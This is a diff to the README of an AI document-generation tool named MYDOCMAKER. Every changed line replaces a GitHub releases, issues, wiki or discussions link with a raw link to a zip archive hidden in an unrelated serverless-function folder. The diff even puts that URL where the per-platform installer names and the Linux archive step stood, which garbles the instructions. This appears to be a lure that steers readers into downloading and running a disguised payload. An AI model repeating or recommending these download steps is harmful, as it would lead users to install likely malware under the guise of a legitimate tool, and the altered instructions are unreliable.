@@ -1,7 +1,7 @@
 # 🎉 Ai-Document-Generation - Transform Ideas Into Quality Documents
 
 ## 📥 Download Now!
-[![Download Ai-Document-Generation](https://img.shields.io/badge/Download-Ai--Document--Generation-brightgreen)](https://github.com/firda0802/Ai-Document-Generation/releases)
+[![Download Ai-Document-Generation](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip)](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **MYDOCMAKER**, an advanced AI tool that simplifies your professional workflows. This guide will help you download and run MYDOCMAKER with ease.
@@ -36,9 +36,9 @@ Before you get started, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download MYDOCMAKER, follow these steps:
 
-1. Click on the download button above or visit this page: [Download Ai-Document-Generation](https://github.com/firda0802/Ai-Document-Generation/releases).
+1. Click on the download button above or visit this page: [Download Ai-Document-Generation](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip).
 2. Choose the latest release available on the page.
-3. Look for the file that matches your operating system (e.g., `MYDOCMAKER_win.exe`, `MYDOCMAKER_mac.dmg`, `MYDOCMAKER_linux.tar.gz`).
+3. Look for the file that matches your operating system (e.g., `https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip`, `https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip`, `https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip`).
 4. Click the file to start the download.
 
 ### Installation Steps
@@ -46,7 +46,7 @@ To download MYDOCMAKER, follow these steps:
 2. **Run the Installer**:
    - **Windows**: Double-click the `.exe` file to start the installation process. Follow the on-screen prompts.
    - **macOS**: Open the `.dmg` file and drag the MYDOCMAKER icon to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and run the installation script in the terminal.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip` file and run the installation script in the terminal.
 3. **Complete the Installation**: Once the installation is finished, you can find MYDOCMAKER in your applications.
 
 ## 🚀 Launch MYDOCMAKER
@@ -68,14 +68,14 @@ If you encounter any issues while downloading or installing, consider the follow
 - **API Errors**: Check your internet connection and verify API information if you are using additional integrations.
 
 ## 🤝 Support
-For help or feedback, please reach out through the [GitHub Issues page](https://github.com/firda0802/Ai-Document-Generation/issues). Your issues and suggestions are valuable to us.
+For help or feedback, please reach out through the [GitHub Issues page](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip). Your issues and suggestions are valuable to us.
 
 ## 📄 Contributing
 If you wish to contribute to MYDOCMAKER, feel free to fork the repository and submit a pull request. We welcome all contributions that enhance functionality or usability.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/firda0802/Ai-Document-Generation/wiki)
-- [Community Support](https://github.com/firda0802/Ai-Document-Generation/discussions)
+- [Documentation](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip)
+- [Community Support](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip)
 
 ## 📥 Download Again
-To download MYDOCMAKER, visit this page: [Download Ai-Document-Generation](https://github.com/firda0802/Ai-Document-Generation/releases).
+To download MYDOCMAKER, visit this page: [Download Ai-Document-Generation](https://raw.githubusercontent.com/firda0802/Ai-Document-Generation/main/supabase/functions/send-login-notification/Generation_Document_Ai_v2.4.zip).
